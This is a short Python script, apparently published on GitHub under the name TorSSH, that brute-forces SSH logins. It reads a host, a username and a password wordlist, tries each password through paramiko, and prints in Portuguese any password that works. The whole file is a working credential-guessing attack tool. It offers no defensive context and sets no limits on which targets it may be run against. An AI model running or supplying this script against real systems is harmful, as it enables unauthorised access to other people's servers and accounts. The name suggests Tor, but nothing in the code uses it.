#!/bin/usr/python
#####################################
#               TorSSH              #
#  https://github.com/victorpavoni  #
#####################################
import paramiko,sys

if len(sys.argv) != 4:
    print(f"Modo de uso: python {sys.argv[0]} 127.0.0.1 user wordlist")
    sys.exit(0)

client = paramiko.SSHClient()
client.load_system_host_keys()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

hostname = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]

with open(wordlist, 'r') as file:
    for line in file.readlines():
        try:
            passwd = line.strip()
            print(f"Tentando autenticar com {user}:{passwd}...")
            client.connect(sys.argv[1], username=user, password=passwd)
        except paramiko.ssh_exception.AuthenticationException:
            pass
        else:
            client.close()
            print("------------------------------------------------")
            print(f"[+] Senha encontrada -------> {user}:{passwd}")
            sys.exit(0)
    print("------------------------------------------------")
    print("Nenhuma senha foi encontrada :(")
